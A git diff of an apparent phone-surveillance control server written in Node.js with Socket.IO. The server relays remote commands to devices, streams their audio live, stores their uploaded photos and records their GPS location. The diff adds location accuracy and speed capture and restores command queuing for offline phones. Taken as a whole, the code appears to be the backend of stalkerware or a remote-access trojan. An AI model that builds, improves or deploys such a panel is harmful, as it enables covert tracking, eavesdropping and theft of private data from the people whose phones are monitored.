@@ -45,7 +45,7 @@ app.use(express.static(__dirname));
 let devicesStatus = {}; 
 
 // ==================================================
-//  🔥 MAIN SOCKET LOGIC (FIXED DOUBLE COMMAND)
+//  🔥 MAIN SOCKET LOGIC
 // ==================================================
 io.on('connection', (socket) => {
     
@@ -66,23 +66,22 @@ io.on('connection', (socket) => {
         socket.to(data.room).emit('control-event', data);
     });
 
-    // 🔥 4. Command Handling (FIXED HERE)
+    // 4. Command Handling
     socket.on('send-command', (data) => {
         if (data.targetId && data.command) {
-            // Sirf Socket se bhejo via Realtime
-            console.log(`🚀 Sending Command via Socket: ${data.command}`);
             io.to(data.targetId).emit('command', data.command);
             
-            // ❌ REMOVED: Niche wali lines hata di hain taaki polling mai double na jaye
-            /* if(devicesStatus[data.targetId]) {
+            if(devicesStatus[data.targetId]) {
                 devicesStatus[data.targetId].command = data.command;
             }
-            */
         }
     });
 
-    // 5. Audio Stream Relay (Binary)
+    // 5. Audio Stream Relay (Binary) - 🔥 DEBUGGING ADDED
     socket.on('audio-stream', (blob) => {
+        // 👇 YE LINE BATAYEGI KI AUDIO SERVER PAR PAHUCHA YA NAHI
+        // console.log(`🔊 Audio Chunk: ${blob ? blob.length : 0} bytes`); 
+
         const rooms = socket.rooms;
         for (const room of rooms) {
             if (room !== socket.id) {
@@ -95,7 +94,7 @@ io.on('connection', (socket) => {
 });
 
 app.get('/', (req, res) => {
-    res.send('✅ Server Running: Double Screenshot Fixed!');
+    res.send('✅ Server Running: Audio Debug + Location Accuracy Fixed!');
 });
 
 // ==================================================
@@ -124,18 +123,8 @@ app.post('/api/upload-image', (req, res) => {
 
 app.get('/api/gallery-list/:device_id', (req, res) => {
     const id = req.params.device_id.toUpperCase();
-    // 🔥 LIMIT LOGIC ADDED: Default 20 photos
-    const limit = req.query.limit ? parseInt(req.query.limit) : 20;
     const next_cursor = req.query.next_cursor || null;
-
-    cloudinary.api.resources({ 
-        type: 'upload', 
-        prefix: id + "/", 
-        max_results: limit, // Use Limit
-        next_cursor: next_cursor, 
-        direction: 'desc', 
-        context: true 
-    }, 
+    cloudinary.api.resources({ type: 'upload', prefix: id + "/", max_results: 20, next_cursor: next_cursor, direction: 'desc', context: true }, 
     (error, result) => {
         if (error) return res.json({ photos: [], next_cursor: null });
         const photos = result.resources.map(img => img.secure_url);
@@ -161,13 +150,13 @@ app.get('/api/device-status/:id', (req, res) => {
 
 app.post('/api/status', (req, res) => {
     try {
+        // 🔥 Added 'accuracy' and 'speed' here
         let { device_id, model, battery, level, version, charging, lat, lon, accuracy, speed } = req.body;
         if (!device_id) return res.status(400).json({ error: "No ID" });
 
         const id = device_id.toString().trim().toUpperCase();
         let pendingCommand = "none";
         
-        // Agar pehle se koi command pending hai (fallback) toh wo bhejo
         if (devicesStatus[id] && devicesStatus[id].command) {
             pendingCommand = devicesStatus[id].command;
             devicesStatus[id].command = "none"; 
@@ -182,8 +171,8 @@ app.post('/api/status', (req, res) => {
             charging: (String(charging) === "true"),
             lat: lat || (devicesStatus[id]?.lat || 0),
             lon: lon || (devicesStatus[id]?.lon || 0),
-            accuracy: accuracy || (devicesStatus[id]?.accuracy || 0),
-            speed: speed || (devicesStatus[id]?.speed || 0),
+            accuracy: accuracy || (devicesStatus[id]?.accuracy || 0), // ✅ SAVING ACCURACY
+            speed: speed || (devicesStatus[id]?.speed || 0),          // ✅ SAVING SPEED
             lastSeen: Date.now(),
             command: devicesStatus[id]?.command || "none" 
         };
@@ -195,7 +184,7 @@ app.post('/api/status', (req, res) => {
 });
 
 // ==================================================
-//  🔥 DATA STORAGE
+//  🔥 DATA STORAGE (Updated for Location Accuracy)
 // ==================================================
 
 app.post('/api/upload_data', async (req, res) => { 
@@ -208,6 +197,7 @@ app.post('/api/upload_data', async (req, res) => {
     try {
         let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
 
+        // 🔥 Update Live Location Status
         if (type === 'location') {
             const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
             
@@ -216,6 +206,8 @@ app.post('/api/upload_data', async (req, res) => {
                 
                 devicesStatus[id].lat = locObj.lat || locObj.latitude;
                 devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
+                
+                // ✅ Capture Accuracy & Speed from Data Logs
                 devicesStatus[id].accuracy = locObj.accuracy || locObj.acc || 0;
                 devicesStatus[id].speed = locObj.speed || 0;
             }
@@ -263,22 +255,14 @@ app.get('/api/get-data/:device_id/:type', async (req, res) => {
     }
 });
 
-// Fallback command API (Updated to prioritize Socket)
+// Fallback command API
 app.post('/api/send-command', (req, res) => {
     let { device_id, command } = req.body;
     if (!device_id || !command) return res.status(400).json({ error: "Missing Info" });
     const id = device_id.toUpperCase().trim();
-    
-    // 1. Try sending via Socket first
+    if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
+    devicesStatus[id].command = command;
     io.to(id).emit('command', command);
-
-    // 2. Sirf tab save karo agar API se call ho raha hai,
-    // Lekin user ka 'send-command' event ab save nahi karta, to ye API call bhi clean rakhte hain.
-    // Agar phone offline hai to command miss ho sakta hai, lekin double capture nahi hoga.
-    
-    // Un-comment below line ONLY IF you want offline devices to capture later
-    // devicesStatus[id] = { ...devicesStatus[id], command: command }; 
-
     res.json({ status: "success", command: command });
 });
 
